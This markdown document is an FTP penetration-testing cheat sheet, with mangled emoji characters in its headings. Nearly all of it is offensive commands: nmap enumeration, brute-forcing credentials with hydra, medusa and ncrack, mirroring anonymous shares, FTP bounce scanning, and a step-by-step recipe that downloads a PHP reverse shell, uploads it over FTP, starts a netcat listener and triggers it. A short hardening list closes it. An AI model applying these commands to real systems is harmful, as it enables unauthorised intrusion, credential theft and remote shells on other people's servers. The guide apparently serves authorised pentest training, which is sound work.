# ğŸ› ï¸ FTP (File Transfer Protocol) â€“ Penetration Testing Guide

FTP is one of the oldest protocols for file transfer and often misconfigured, making it a high-value target during penetration tests.

---

## ğŸ” Overview

- **Default Port:** 21/tcp  
- **Purpose:** File transfer between client â†” server  
- **Model:** Clientâ€“Server  

### Common Weaknesses
- Plain-text credentials  
- Anonymous login enabled  
- Old/Unpatched FTP servers (vsFTPd, ProFTPD, etc.)  
- Directory traversal  
- FTP Bounce attack  
- Weak authentication  
- Misconfigured permissions  

---

## ğŸš€ Key Strength Points

- âœ” Anonymous access often enabled  
- âœ” Credentials sent in clear-text (MITM possible)  
- âœ” Easy brute-forcing  
- âœ” Can be used as a pivot to upload a webshell  
- âœ” Supports Bounce Scanning for stealth port scans  
- âœ” Weak isolation â†’ attackers can download/upload/overwrite files  
- âœ” Useful for lateral movement when combined with web servers  

---

## ğŸ§ª Basic Commands â€“ FTP Client

```bash
ftp <target-ip> <port>
```

**URL-based login**
```bash
ftp://username:password@<target-ip>
```

**Better FTP client**
```bash
lftp <target-ip>
```

---

## ğŸ” Recon & Enumeration

**Port Scan**
```bash
nmap -p 21 <target>
nmap -Pn -sV -p21 <target>
```

**Banner Grab / Manual Check**
```bash
telnet <target> 21     # press CTRL+]
nc -v <target> 21
```

**Nmap Enumeration Scripts**
```bash
nmap -p21 --script ftp-anon,ftp-syst,ftp-banner,ftp-proftpd-backdoor <target>
nmap -p21 --script ftp-features <target>
```

**Bruteforce Directory Listings via FTP URL**
```bash
gobuster dir -u ftp://<target>/ -w /path/to/wordlist
```

---

## ğŸ” Bruteforcing Credentials

**Using Hydra**
```bash
hydra -L users.txt -P pass.txt ftp://<target>
# OR
hydra -l admin -P pass.txt ftp://<target> -f

medusa -u admin -P 500-worst-passwords.txt -h <target> -M ftp

ncrack -u admin -P 500-worst-passwords.txt -T 5 10.10.10.10 -p 21
```

**Using Nmap**
```bash
nmap -p21 --script ftp-brute <target>
```

---

## ğŸ’¥ Exploitation

**Search Exploits (Metasploit)**
```bash
msfconsole
search ftp
use exploit/unix/ftp/<module>
```

**Download Everything (Anonymous FTP Dump)**
```bash
wget -m ftp://anonymous:anonymous@<target-ip>
```

---

## ğŸ•³ï¸ Gain Reverse Shell (Webshell via FTP Upload)

1. Download PHP Reverse Shell:
   ```bash
   wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
   ```

2. Set Callback IP & Port inside `shell.php`:
   ```php
   $ip   = 'YOUR_IP';
   $port = 4444;
   ```

3. Upload via FTP:
   ```bash
   ftp <target-ip>
   put shell.php
   ```

4. Start Listener:
   ```bash
   nc -lvnp 4444
   ```

5. Trigger Shell:
   ```
   http://target.com/uploads/shell.php
   ```

---

## ğŸ¯ FTP Bounce Attack (Stealth Port Scanning)

FTP Bounce abuses the `PORT` command to make the FTP server scan other systems as a proxy.

**Manual Bounce Steps**
```bash
ftp <ftp-server>
quote PORT <target-IP>,<target-port>
get anything.txt
```

**Bounce Scan with Nmap**
```bash
nmap -b <user:pass@ftp-server>:21 <target-subnet>
```

**Bounce Scan Using Metasploit**
```bash
use auxiliary/scanner/ftp/ftp_bounce
set RHOSTS <ftp-server>
set RPORT 21
run
```

---

## ğŸ›¡ï¸ Hardening & Defense

- Disable anonymous login  
- Enforce FTPS (TLS) â€” never allow plain FTP  
- Strong passwords + lockout policies  
- Use chroot jails  
- Keep FTP services updated  
- Avoid using FTP for sensitive environments  

---
```
